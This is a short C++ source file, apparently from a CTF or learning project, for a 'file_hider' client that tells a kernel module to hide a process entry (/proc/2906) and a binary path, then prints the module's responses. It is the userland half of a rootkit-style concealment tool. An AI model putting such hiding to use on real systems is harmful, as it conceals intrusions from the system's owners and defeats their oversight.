//
// Created by idan on 1/11/24.
//

#include <cstring>
#include <iostream>
#include "file_hider.h"

void file_hider::run() {
    hide_path("/proc/2906");
    hide_path("/home/idan/ctf/a.out");

//    memset(&msg, '\x00', sizeof(msg));
//    msg.id = OPER_REMOVE_HIDDEN_PATH;
//    strcpy(msg.data, "/usr/bin/id");
//    my_send_msg(msg);

    size_t i = 0;
    while (i < 20000) {
        std::cout << i << ": ";

        struct msg_to_user response = kernelAccess.my_recv_msg();
        printf("%s\n", response.data);

        i++;
    }
}

void file_hider::stop() {

}

void file_hider::hide_path(char *path) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_ADD_HIDDEN_PATH;
    strcpy(msg.data, path);

    kernelAccess.my_send_msg(msg);
}
